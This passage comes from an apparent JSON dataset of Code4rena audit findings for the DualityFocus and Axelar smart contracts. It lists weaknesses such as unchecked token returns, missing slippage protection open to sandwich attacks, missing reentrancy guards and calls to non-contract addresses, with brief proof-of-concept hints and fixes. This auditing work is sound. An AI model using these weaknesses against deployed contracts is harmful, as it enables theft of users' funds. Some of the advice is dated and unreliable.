(https://blog.openzeppelin.com/uma-audit-phase-4/)\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nAdd events to all functions that change critical parameters.\n\n\n# C4-009 : The Contract Should approve(0) first\n\n## Impact  - LOW\n\nSome tokens (like USDT L199) do not work when changing the allowance from an existing non-zero allowance value.\nThey must first be approved by zero and then the actual allowance must be approved.\n\n```\nIERC20(token).safeApprove(address(operator), 0);\nIERC20(token).safeApprove(address(operator), amount);\n```\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L418\n\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L533\n\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L536\n\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L651\n```\n2.  When trying to re-approve an already approved token, all transactions revert and the protocol cannot be used.\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nApprove with a zero amount first before setting the actual amount. Consider use safeIncreaseAllowance and safeDecreaseAllowance.\n\n\n# C4-010 : Use of Block.timestamp\n\n## Impact -  Non-Critical\n\nBlock timestamps have historically been used for a variety of applications, such as entropy for random numbers (see the Entropy Illusion for further details), locking funds for periods of time, and various state-changing conditional statements that are time-dependent. Miners have the ability to adjust timestamps slightly, which can prove to be dangerous if block timestamps are used incorrectly in smart contracts.\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L676\n```\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nBlock timestamps should not be used for entropy or generating random numbers—i.e., they should not be the deciding factor (either directly or through some derivation) for winning a game or changing an important state.\n\nTime-sensitive logic is sometimes required; e.g., for unlocking contracts (time-locking), completing an ICO after a few weeks, or enforcing expiry dates. It is sometimes recommended to use block.number and an average block time to estimate times; with a 10 second block time, 1 week equates to approximately, 60480 blocks. Thus, specifying a block number at which to change a contract state can be more secure, as miners are unable to easily manipulate the block number.\n\n# C4-011 : # USE SAFEERC20.SAFEAPPROVE INSTEAD OF APPROVE\n\n## Impact - LOW\n\nNote that approve() will fail for certain token implementations that do not return a boolean value (). Hence it is recommend to use safeApprove().\n\n\n## Proof of Concept\n\n```\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L418\n\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L533\n\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L536\n\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L651\n```\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nConsider using safeIncreaseAllowance instead of approve function. (Approve race condition)",
    "dataSource": {
      "name": "code-423n4/2022-04-dualityfocus-findings",
      "repo": "https://github.com/code-423n4/2022-04-dualityfocus-findings",
      "url": "https://github.com/code-423n4/2022-04-dualityfocus-findings/issues/33"
    }
  },
  {
    "title": "QA Report",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CToken.sol#L1718\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CErc20.sol#L179\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CErc20.sol#L205\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CErc20.sol#L217\n\n\n# Vulnerability details\n\n## Impact\nthis bug is also well-known. i notice that cERC20.sol, doTransferIn and doTransferOut all use the _callOptionalReturn func to do the heavy lift. but, when dig inside the _callOptionalReturn func, it use the _functionCall func to transfer tokens. but it doesn't check the token address must be contract address.\nif the target is an EOA, it also pass.\nthis bug leads to the infamous Qubit hack. also first pointed out by Samczsun for the 0x protocol. you may refer to samczsun's link to check it better.\nhttps://samczsun.com/the-0x-vulnerability-explained/\n## Proof of Concept\n\n```js\nfunction doTransferOut(address payable to, uint256 amount) internal {\n        _callOptionalReturn(\n            abi.encodeWithSelector(EIP20NonStandardInterface(underlying).transfer.selector, to, amount),\n            \"TOKEN_TRANSFER_OUT_FAILED\"\n        );\n    }\nfunction _callOptionalReturn(bytes memory data, string memory errorMessage) internal {\n        bytes memory returndata = _functionCall(underlying, data, errorMessage);\n        if (returndata.length > 0) require(abi.decode(returndata, (bool)), errorMessage);\n    }\nfunction _functionCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        (bool success, bytes memory returndata) = target.call(data);\n\n}\n===>\njust call doTransferOut(address(0), amount);\n```\n\n## Tools Used\nmanual\n\n## Recommended Mitigation Steps\n```js\nfunction _functionCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        require(isContract(target), \"Address: delegate call to non-contract\");\n        (bool success, bytes memory returndata) = target.call(data);\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-dualityfocus-findings",
      "repo": "https://github.com/code-423n4/2022-04-dualityfocus-findings",
      "url": "https://github.com/code-423n4/2022-04-dualityfocus-findings/issues/23"
    }
  },
  {
    "title": "QA Report",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/main/contracts/vault_and_oracles/UniV3LpVault.sol#L621-L627\n\n\n# Vulnerability details\n\n## Impact\nThere is no slippage control on _swap of UniV3LpVault, which expose strategy to sandwich attack.\n```\n    function _swap(bytes memory swapPath, uint256 amount) internal returns (uint256 amountOut) {\n        IERC20Detailed(swapPath.toAddress(0)).approve(address(swapRouter), amount);\n        amountOut = swapRouter.exactInput(\n            ISwapRouter.ExactInputParams(swapPath, address(this), block.timestamp + 200, amount, 0)\n        );\n        IERC20Detailed(swapPath.toAddress(0)).approve(address(swapRouter), 0);\n    }\n```\nhttps://docs.uniswap.org/protocol/reference/periphery/interfaces/ISwapRouter#exactinputparams\n\n\n## Proof of Concept\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/main/contracts/vault_and_oracles/UniV3LpVault.sol#L621-L627\nhttps://docs.uniswap.org/protocol/reference/periphery/interfaces/ISwapRouter#exactinputparams\n## Tools Used\nNone\n## Recommended Mitigation Steps\nReplace 0 in the parameter of _swap with amountOutMinimum.\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-dualityfocus-findings",
      "repo": "https://github.com/code-423n4/2022-04-dualityfocus-findings",
      "url": "https://github.com/code-423n4/2022-04-dualityfocus-findings/issues/22"
    }
  },
  {
    "title": "QA Report",
    "body": "1. There are a lack of input checks around the contracts:\n- [CErc20Immutable.sol#L34](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CErc20Immutable.sol#L34)\n- [CErc20.sol#L21-L26](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CErc20.sol#L21-L26)\n- [FlashLoan.sol#L24](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/FlashLoan.sol#L24)\n- [UniswapTwapOracle.sol#L71-L78](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L71-L78)\n- [UniV3LpVault.sol#L60-L63](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L60-L63)\n- [Comptroller.sol#L82](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L82)\n\n2. It was found some `transfer`, `approve` or `transferFrom` without checking the boolean result, ERC20 standard specify that the token can return false if this call was not made, so it's mandatory to check the result of approve methods.\n- [CErc20.sol#L144](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CErc20.sol#L144)\n- [FlashLoan.sol#L48](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/FlashLoan.sol#L48)\n- [FlashLoan.sol#L57-L58](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/FlashLoan.sol#L57-L58)\n- [UniV3LpVault.sol#L366](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L366)\n- [UniV3LpVault.sol#L418](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L418)\n- [UniV3LpVault.sol#L536](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L536)\n- [UniV3LpVault.sol#L622](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L622)\n- [UniV3LpVault.sol#L626](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L626)\n- [UniV3LpVault.sol#L650-L651](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L650-L651)\n- [UniV3LpVault.sol#L665-L666](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L665-L666)\n- [UniV3LpVault.sol#L704-L705](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L704-L705)\n- [UniV3LpVault.sol#L723-L724](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L723-L724)\n\n3. The modification process of an owner is a delicate process, since the governance of our contract and therefore of the project may be at risk, for this reason it is recommended to adjust the owner’s modification logic, to a logic that allows to verify that the new owner is in fact valid and does exist.\nIt's mandatory to create a logic of the owner’s modification where a new owner is proposed first, the owner accepts the proposal and, in this way, we make sure that there are no errors when writing the address of the new owner.\n- [MasterPriceOracle.sol#L83](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/MasterPriceOracle.sol#L83)\n\n4. OPEN TODO, it's a bad practice to have unfinished code during a security review.\n- [UniV3LpVault.sol#L142](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L142)\n- [UniV3LpVault.sol#L166](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L166)",
    "dataSource": {
      "name": "code-423n4/2022-04-dualityfocus-findings",
      "repo": "https://github.com/code-423n4/2022-04-dualityfocus-findings",
      "url": "https://github.com/code-423n4/2022-04-dualityfocus-findings/issues/8"
    }
  },
  {
    "title": "QA Report",
    "body": "Title: Use safe math for solidity version <8\nSeverity: Low Risk\n\nYou should use safe math for solidity version <8 since there is no default over/under flow check it suchversions of solidity.\n        The contract Comptroller.sol doesn't use safe math and is of solidity version < 8\n        The contract MasterPriceOracle.sol doesn't use safe math and is of solidity version < 8\n        The contract CToken.sol doesn't use safe math and is of solidity version < 8\n\nTitle: Assert instead require to validate user inputs\nSeverity: Low Risk\n\n\n        From solidity docs: Properly functioning code should never reach a failing assert statement; if this happens there is a bug in your contract which you should fix.\n        With assert the user pays the gas and with require it doesn't. The ETH network gas isn't cheap and users can see it as a scam.\n        \n        Comptroller.sol : reachable assert in line 402\n        UniswapTwapOracle.sol : reachable assert in line 195\n        Comptroller.sol : reachable assert in line 1309\n        Comptroller.sol : reachable assert in line 213\n        Comptroller.sol : reachable assert in line 272\n        UniV3LpVault.sol : reachable assert in line 777\n\n\nTitle: Two arrays length mismatch\nSeverity: Low/Med Risk\n\n\nThe functions below fail to perform input validation on arrays to verify the lengths match.\nA mismatch could lead to an exception or undefined behavior.\nConsider making this a medium risk please.\n    \n    \n        Comptroller.sol, _setMarketBorrowCaps  ['cTokens', 'newBorrowCaps'] \n\nTitle: transfer return value of a general ERC20 is ignored\nSeverity: Low/High Risk\n\nNeed to use safeTransfer instead of transfer. As there are popular tokens, such as USDT that transfer/trasnferFrom method doesn’t return anything. The transfer return value has to be checked (as there are some other tokens that returns false instead revert), that means you must \n 1. Check the transfer return value\nAnother popular possibility is to add a whiteList.\nThose are the appearances (solidity file, line number, actual line):\n\n        FlashLoan.sol, 57 (executeOperation), IERC20(assets[0]).transferFrom(address(LP_VAULT), address(this), amountOwing);\n\n\n\nTitle: approve return value is ignored\nSeverity: Low/Med Risk\n\nSome tokens don't correctly implement the EIP20 standard and their approve function returns void instead of a success boolean. \nCalling these functions with the correct EIP20 function signatures will always revert.\nTokens that don't correctly implement the latest EIP20 spec, like USDT, will be unusable in the mentioned contracts as they revert the transaction because of the missing return value.\nWe recommend using OpenZeppelin’s SafeERC20 versions with the safeApprove function that handle the return value check as well as non-standard-compliant tokens.\n\n\n    UniV3LpVault.sol, 664,         IERC20Detailed(token0).approve(address(nonfungiblePositionManager), 0);\n    UniV3LpVault.sol, 621,         IERC20Detailed(swapPath.toAddress(0)).approve(address(swapRouter), amount);\n    UniV3LpVault.sol, 625,         IERC20Detailed(swapPath.toAddress(0)).approve(address(swapRouter), 0);\n    UniV3LpVault.sol, 665,         IERC20Detailed(token1).approve(address(nonfungiblePositionManager), 0);\n\n    \nTitle: ETH send return value is ignored while is gas limited\nSeverity: Low/Med Risk\n\nThe use of send() / call() to send ETH may have unintended outcomes on the eth being sent to the receiver. Eth may be irretrievable or undelivered if the msg.sender or feeRecipient is a smart contract. Funds can potentially be lost if;\n        1. The smart contract fails to implement the payable fallback function\n        2. The fallback function uses more than 2300 gas units \nDifferent from .transfer(...), .send(...) and call(...) doesn't revert when it fails, and therefore its retrun value is extremely important.\nThe latter situation may occur in the instance of gas cost changes. The impact would mean that any contracts receiving funds would potentially be unable to retrieve funds from the transaction.\nA detailed explanation of why relying on payable().transfer() may result in unexpected loss of eth can be found here: https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now \nThis is not just a best-practice advice since the return value isn't considered!!! If you would consider it then it was just a best practice.\n\n    CToken.sol, 1626,         address(newInterestRateModel).call(abi.encodeWithSignature(\"checkpointInterest()\"));\n    CToken.sol, 1623,             address(oldInterestRateModel).call(abi.encodeWithSignature(\"resetInterestCheckpoints()\"));\n    CToken.sol, 473,         address(interestRateModel).call(abi.encodeWithSignature(\"checkpointInterest(uint256)\", borrowRateMantissa));\n\n\nTitle: Must approve 0 first\nSeverity: Low/Med Risk\n\n\nSome tokens (like USDT) do not work when changing the allowance from an existing non-zero allowance value.\nThey must first be approved by zero and then the actual allowance must be approved.\n\n    approve without approving 0 first UniV3LpVault.sol, 417,             IERC20Detailed(params.asset).approve(msg.sender, owedBack);\n    approve without approving 0 first UniV3LpVault.sol, 532,         IERC20Detailed(params.underlying).approve(address(params.debtCToken), params.repayAmount);\n\n\n\n\nTitle: Duplicates in array\nSeverity: Low Risk\n\n\n        You allow in some arrays to have duplicates. Sometimes you assumes there are no duplicates in the array.\n        \n        Comptroller.addToMarketInternal pushed (cToken) \n\n\n\n\n\nTitle: Solidity compiler versions mismatch\nSeverity: Low Risk\n\n\nThe project is compiled with different versions of solidity, which is not recommended because it can lead to undefined behaviors.\n        \n        \n\n\n\nTitle: Missing non reentrancy modifier\nSeverity: Low Risk\n\nThe following functions are missing reentrancy modifier although some other pulbic/external functions does use reentrancy modifer.\nEven though I did not find a way to exploit it, it seems like those functions should have the nonReentrant modifier as the other functions have it as well..\n\n        CToken.sol, accrueInterest is missing a reentrancy modifier\n        UniV3LpVault.sol, _setFlashLoan is missing a reentrancy modifier\n        CToken.sol, _setNameAndSymbol is missing a reentrancy modifier\n        CToken.sol, initialize is missing a reentrancy modifier\n        CToken.sol, balanceOfUnderlying is missing a reentrancy modifier\n        UniV3LpVault.sol, _pausePeripheryFunctions is missing a reentrancy modifier\n        UniV3LpVault.sol, _sweep is missing a reentrancy modifier\n        UniV3LpVault.sol, flashFocusCall is missing a reentrancy modifier\n        UniV3LpVault.sol, _setUserTokensMax is missing a reentrancy modifier\n        CToken.sol, _setInterestRateModel is missing a reentrancy modifier\n        UniV3LpVault.sol, _sweepNFT is missing a reentrancy modifier\n        CToken.sol, approve is missing a reentrancy modifier\n        UniV3LpVault.sol, _pauseDeposits is missing a reentrancy modifier\n        CToken.sol, _acceptAdmin is missing a reentrancy modifier\n\n\n\nTitle: Check transfer receiver is not 0 to avoid burned money\nSeverity: Low Risk\n\n\nTransferring tokens to the zero address is usually prohibited to accidentally avoid \"burning\" tokens by sending them to an unrecoverable zero address.\n\n\n        https://github.com/code-423n4/2022-04-dualityfocus/tree/main/contracts/compound_rari_fork/CToken.sol#L562\n        https://github.com/code-423n4/2022-04-dualityfocus/tree/main/contracts/compound_rari_fork/CToken.sol#L1364\n        https://github.com/code-423n4/2022-04-dualityfocus/tree/main/contracts/compound_rari_fork/CToken.sol#L81\n        https://github.com/code-423n4/2022-04-dualityfocus/tree/main/contracts/vault_and_oracles/UniV3LpVault.sol#L337\n        https://github.com/code-423n4/2022-04-\n\n\nTitle: Does not validate the input fee parameter\nSeverity: Low Risk\n\n\nSome fee parameters of functions are not checked for invalid values. Validate the parameters:\n        \n        \n        UniV3LpVault._prepareForDeposit (fee)\n        Comptroller.seizeAllowedUniV3 (seizeFeesToken0)\n        Comptroller.seizeAllowedUniV3 (seizeFeesToken1)\n        UniV3LpVault.seizeAssets (seizeFeesToken1)\n        UniV3LpVault.seizeAssets (seizeFeesToken0)\n\n\n\nTitle: Not verified owner\nSeverity: Low Risk\n\n\n        owner param should be validated to make sure the owner address is not address(0).\n        Otherwise if not given the right input all only owner accessible functions will be unaccessible.\n        \n        \n        CToken.sol.allowance owner\n        CToken.sol.balanceOf owner\n        CToken.sol.balanceOfUnderlying owner\n\n\n\nTitle: Never used parameters\nSeverity: Low Risk\n\nThose are functions and parameters pairs that the function doesn't use the parameter. In case those functions are external/public this is even worst since the user is required to put value that never used and can misslead him and waste its time. \n\n        Comptroller.sol: function seizeAllowedUniV3 parameter liquidator isn't used. (seizeAllowedUniV3 is external)\n        Comptroller.sol: function seizeAllowedUniV3 parameter borrower isn't used. (seizeAllowedUniV3 is external)\n        Comptroller.sol: function transferAllowed parameter dst isn't used. (transferAllowed is external)\n\n\n\nTitle: Not verified input\nSeverity: Low Risk\n\n\n    external / public functions parameters should be validated to make sure the address is not 0.\n    Otherwise if not given the right input it can mistakenly lead to loss of user funds.\n    \n        \n        UniswapTwapOracle.sol.constructor _factory\n        Comptroller.sol.borrowAllowed borrower\n        CToken.sol.redeemBehalfInternal redeemer\n        Comptroller.sol.repayBorrowAllowed borrower\n\n\n\nTitle: Open TODOs\nSeverity: Low Risk\n\nOpen TODOs can hint at programming or architectural errors that still need to be fixed. \nThese files has open TODOs:\n\nOpen TODO in UniV3LpVault.sol line 165 :     // TODO: do we want a \"decreaseLiquidityAndCollect\" function?\n\nOpen TODO in UniswapTwapOracle.sol line 52 :     // period used to calculate our TWAPs, in TODO units\n\nOpen TODO in UniV3LpVault.sol line 141 :         // TODO: do we want some Comptroller like error handling/messaging here?\n\nOpen TODO in Comptroller.sol line 1011 :         // TODO: custom liquidation incentive for LP shares\n\n\nTitle: Named return issue\nSeverity: Low Risk\n\nUsers can mistakenly think that the return value is the named return, but it is actually the actualreturn statement that comes after. To know that the user needs to read the code and is confusing.\nFurthermore, removing either the actual return or the named return will save gas. \n\n        UniswapTwapOracle.sol, getTokenBreakdownTWAP\n        UniswapTwapOracle.sol, getTokenBreakdownCurrent\n        UniV3LpVault.sol, repayDebt",
    "dataSource": {
      "name": "code-423n4/2022-04-dualityfocus-findings",
      "repo": "https://github.com/code-423n4/2022-04-dualityfocus-findings",
      "url": "https://github.com/code-423n4/2022-04-dualityfocus-findings/issues/4"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "## Title: Less code can save gas\n## Summary\ninstead of executing the same function in every if statements and then return it. we can put that function in the end line to save gas \n\nPOC\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGateway.sol#L294-L334\n\nbefore\n'''\n\n        bool burnSuccess = false;\n\n        if (tokenType == TokenType.External) {\n            _checkTokenStatus(symbol);\n\n            burnSuccess = _callERC20Token(\n                tokenAddress,\n                abi.encodeWithSelector(IERC20.transferFrom.selector, sender, address(this), amount)\n            );\n\n            if (!burnSuccess) revert BurnFailed(symbol);\n\n            return;\n        }\n\n        if (tokenType == TokenType.InternalBurnableFrom) {\n            burnSuccess = _callERC20Token(\n                tokenAddress,\n                abi.encodeWithSelector(IERC20BurnFrom.burnFrom.selector, sender, amount)\n            );\n\n            if (!burnSuccess) revert BurnFailed(symbol);\n\n            return;\n        }\n\n        burnSuccess = _callERC20Token(\n            tokenAddress,\n            abi.encodeWithSelector(\n                IERC20.transferFrom.selector,\n                sender,\n                BurnableMintableCappedERC20(tokenAddress).depositAddress(bytes32(0)),\n                amount\n            )\n        );\n\n        if (!burnSuccess) revert BurnFailed(symbol);\n\n        BurnableMintableCappedERC20(tokenAddress).burn(bytes32(0));\n'''\n\nafter\n'''\n\n        bool burnSuccess = false;\n\n        if (tokenType == TokenType.External) {\n            _checkTokenStatus(symbol);\n\n            burnSuccess = _callERC20Token(\n                tokenAddress,\n                abi.encodeWithSelector(IERC20.transferFrom.selector, sender, address(this), amount)\n            );\n        }\n        else if (tokenType == TokenType.InternalBurnableFrom) {\n            burnSuccess = _callERC20Token(\n                tokenAddress,\n                abi.encodeWithSelector(IERC20BurnFrom.burnFrom.selector, sender, amount)\n            );\n        }\n        else { \n            burnSuccess = _callERC20Token(\n            tokenAddress,\n            abi.encodeWithSelector(\n                IERC20.transferFrom.selector,\n                sender,\n                BurnableMintableCappedERC20(tokenAddress).depositAddress(bytes32(0)),\n                amount ));\n        }\n\n        if (!burnSuccess) revert BurnFailed(symbol);\n\n        BurnableMintableCappedERC20(tokenAddress).burn(bytes32(0));\n'''\n",
    "dataSource": {
      "name": "code-423n4/2022-04-axelar-findings",
      "repo": "https://github.com/code-423n4/2022-04-axelar-findings",
      "url": "https://github.com/code-423n4/2022-04-axelar-findings/issues/40"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "### Using `1` and `2` rather than `0` and `1` saves gas\nSee [this](https://github.com/code-423n4/2022-01-yield-findings/issues/102) issue from a prior contest for details\n1. File: src/DepositHandler.sol (lines [6-7](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/DepositHandler.sol#L6-L7))\n```solidity\n    uint256 internal constant IS_NOT_LOCKED = uint256(0);\n    uint256 internal constant IS_LOCKED = uint256(1);\n```\n\n### Not using the named return variables when a function returns, wastes deployment gas\n\n1. File: src/Context.sol (line [17](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/Context.sol#L17))\n```solidity\n        return payable(msg.sender);\n```\n\n### Use a more recent version of solidity\nUse a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value\n\n1. File: src/AxelarGateway.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n2. File: src/ERC20.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ERC20.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n3. File: src/AdminMultisigBase.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AdminMultisigBase.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n4. File: src/Context.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/Context.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n5. File: src/DepositHandler.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/DepositHandler.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n6. File: src/AxelarGatewayMultisig.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n7. File: src/BurnableMintableCappedERC20.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/BurnableMintableCappedERC20.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n8. File: src/Ownable.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/Ownable.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n9. File: src/EternalStorage.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/EternalStorage.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n10. File: src/TokenDeployer.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/TokenDeployer.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n11. File: src/ECDSA.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ECDSA.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n12. File: src/interfaces/IAxelarGateway.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n13. File: src/interfaces/IAxelarGatewayMultisig.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGatewayMultisig.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n14. File: src/interfaces/IERC20BurnFrom.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IERC20BurnFrom.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n15. File: src/interfaces/IAxelarExecutable.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarExecutable.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n16. File: src/interfaces/IERC20.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IERC20.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n17. File: src/AxelarGatewayProxy.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayProxy.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n18. File: src/MintableCappedERC20.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/MintableCappedERC20.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n19. File: src/ERC20Permit.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ERC20Permit.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n\n### Using `bool`s for storage incurs overhead\n```solidity\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be 